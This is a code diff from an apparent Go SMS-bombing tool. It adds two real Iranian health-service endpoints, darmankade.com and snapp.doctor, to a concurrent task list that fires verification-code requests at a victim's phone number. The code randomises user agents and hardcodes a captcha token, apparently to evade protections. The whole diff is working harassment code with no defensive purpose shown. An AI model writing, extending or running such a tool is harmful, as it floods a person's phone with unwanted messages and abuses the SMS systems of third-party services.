@@ -487,6 +487,30 @@ cookieJar, _ := cookiejar.New(nil)
 
 
 
+// --- gw.darmankade.com ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "UserName": phone,
+            "invitationCode": "",
+            "CaptchaToken": "AePsWyPrqV74ei89KcYiXaLwLubFieVvKg", 
+            "RouterPath": "/c/psychologist/",
+            "UserAgent": userAgents[rand.Intn(len(userAgents))],
+        }
+        sendJSONRequest(c, ctx, "https://gw.darmankade.com/Account/SendCode", payload, &wg, ch)
+    }
+}(client)
+
+// --- api.snapp.doctor  ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        url := fmt.Sprintf("https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/%s/sms?cCode=%%2B98", phone)
+        sendGETRequest(c, ctx, url, &wg, ch)
+    }
+}(client)
+
 // --- amoozaa.ir ✅ 
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
